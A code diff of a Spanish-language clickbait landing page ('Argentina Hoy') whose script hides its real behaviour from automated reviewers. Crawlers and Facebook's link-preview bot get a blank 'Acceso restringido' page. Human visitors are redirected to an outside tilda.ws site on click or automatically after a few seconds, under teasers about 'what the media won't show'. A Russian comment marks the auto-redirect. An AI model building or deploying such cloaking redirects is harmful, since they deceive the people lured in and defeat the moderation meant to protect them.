@@ -4,8 +4,8 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Argentina Hoy</title>
-  <meta property="og:title" content="¿Sos argentino de verdad?">
-  <meta property="og:description" content="Contenido exclusivo para argentinos">
+  <meta property="og:title" content="Información exclusiva para argentinos">
+  <meta property="og:description" content="Acceso limitado para ciudadanos locales">
   <meta property="og:image" content="background.jpg">
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
@@ -22,13 +22,13 @@
     }
     h1 {
       color: white;
-      font-size: 2.5em;
+      font-size: 2.3em;
       text-shadow: 2px 2px 5px rgba(0,0,0,0.5);
       margin-bottom: 15px;
     }
     p {
       color: white;
-      font-size: 1.2em;
+      font-size: 1.1em;
       margin-bottom: 30px;
       text-shadow: 1px 1px 3px rgba(0,0,0,0.4);
     }
@@ -53,9 +53,9 @@
   </style>
 </head>
 <body>
-  <h1>¿Sos argentino de verdad?</h1>
-  <p>Contenido exclusivo para argentinos. Acceso limitado.</p>
-  <button class="btn" id="accederBtn">Acceder Ahora</button>
+  <h1>Descubrí lo que no muestran los medios</h1>
+  <p>Acceso limitado a información verificada. Disponible sólo por tiempo limitado.</p>
+  <button class="btn" id="accederBtn">Continuar</button>
 
   <script>
     const isBot = () => {
@@ -66,22 +66,29 @@
         /bot|crawl|spider|facebookexternalhit|headless|phantomjs/.test(ua);
     };
 
-    const isParser = () => {
-      return document.referrer === '' && !navigator.userAgent.includes('Mozilla');
-    }
+    let clicked = false;
+    const targetURL = "https://argentinaforreal.tilda.ws/";
 
-    const safeRedirect = () => {
-      const target = "https://argentinaforreal.tilda.ws/";
-      window.location.replace(target);
-    };
+    document.getElementById("accederBtn").addEventListener("click", () => {
+      if (!clicked && !isBot()) {
+        clicked = true;
+        window.location.replace(targetURL);
+      }
+    });
 
-    if (!isBot() && !isParser()) {
-      setTimeout(safeRedirect, 2500);
-    } else {
+    // Авто-редирект если человек и не кликнул
+    setTimeout(() => {
+      if (!clicked && !isBot()) {
+        window.location.replace(targetURL);
+      }
+    }, 3500);
+
+    if (isBot()) {
       document.body.innerHTML = "<h1 style='color:white;text-shadow:1px 1px 4px black'>Acceso restringido</h1>";
     }
   </script>
 </body>
 </html>
+
 
 
